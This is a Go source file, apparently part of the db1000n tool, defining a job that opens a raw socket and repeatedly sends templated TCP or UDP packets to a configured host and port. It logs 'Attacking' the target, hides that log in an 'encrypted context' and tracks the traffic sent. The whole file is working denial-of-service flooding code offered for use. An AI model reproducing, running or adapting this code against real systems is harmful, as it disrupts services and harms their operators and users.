package jobs

import (
	"context"
	"log"
	"strconv"
	"time"

	"github.com/google/uuid"
	"github.com/mitchellh/mapstructure"
	"go.uber.org/zap"

	"github.com/Arriven/db1000n/src/core/packetgen"
	"github.com/Arriven/db1000n/src/utils"
	"github.com/Arriven/db1000n/src/utils/metrics"
	"github.com/Arriven/db1000n/src/utils/templates"
)

func packetgenJob(ctx context.Context, logger *zap.Logger, globalConfig GlobalConfig, args Args) (data interface{}, err error) {
	ctx, cancel := context.WithCancel(ctx)
	defer cancel()
	defer utils.PanicHandler()

	type packetgenJobConfig struct {
		BasicJobConfig
		Packet  map[string]interface{}
		Network packetgen.NetworkConfig
		Host    string
		Port    string
	}

	var jobConfig packetgenJobConfig

	if err := utils.Decode(args, &jobConfig); err != nil {
		logger.Debug("error parsing job config", zap.Error(err))

		return nil, err
	}

	host := templates.ParseAndExecute(jobConfig.Host, nil)

	port, err := strconv.Atoi(templates.ParseAndExecute(jobConfig.Port, nil))
	if err != nil {
		logger.Debug("error parsing port", zap.Error(err))

		return nil, err
	}

	if jobConfig.Network.Address == "" {
		jobConfig.Network.Address = "0.0.0.0"
	}

	if jobConfig.Network.Name == "" {
		jobConfig.Network.Name = "ip4:tcp"
	}

	packetTpl, err := templates.ParseMapStruct(jobConfig.Packet)
	if err != nil {
		logger.Debug("error parsing packet", zap.Error(err))

		return nil, err
	}

	if !isInEncryptedContext(ctx) {
		log.Printf("Attacking %v:%v", host, port)
	}

	protocolLabelValue := "tcp"
	if _, ok := jobConfig.Packet["udp"]; ok {
		protocolLabelValue = "udp"
	}

	const base10 = 10

	hostPort := host + ":" + strconv.FormatInt(int64(port), base10)

	rawConn, err := packetgen.OpenRawConnection(jobConfig.Network)
	if err != nil {
		logger.Debug("error building raw connection", zap.Error(err))

		return nil, err
	}

	trafficMonitor := metrics.Default.NewWriter(metrics.Traffic, uuid.New().String())
	go trafficMonitor.Update(ctx, time.Second)

	for jobConfig.Next(ctx) {
		packetConfigRaw := packetTpl.Execute(ctx)
		logger.Debug("rendered packet config template", zap.Reflect("config", packetConfigRaw))

		var packetConfig packetgen.PacketConfig
		if err := mapstructure.WeakDecode(packetConfigRaw, &packetConfig); err != nil {
			logger.Debug("error parsing packet config", zap.Error(err))

			return nil, err
		}

		n, err := packetgen.SendPacket(packetConfig, rawConn, host, port)
		if err != nil {
			logger.Debug("error sending packet", zap.Error(err))
			metrics.IncPacketgen(
				host,
				hostPort,
				protocolLabelValue,
				metrics.StatusFail)

			return nil, err
		}

		metrics.IncPacketgen(
			host,
			hostPort,
			protocolLabelValue,
			metrics.StatusSuccess)

		trafficMonitor.Add(uint64(n))
	}

	return nil, nil
}
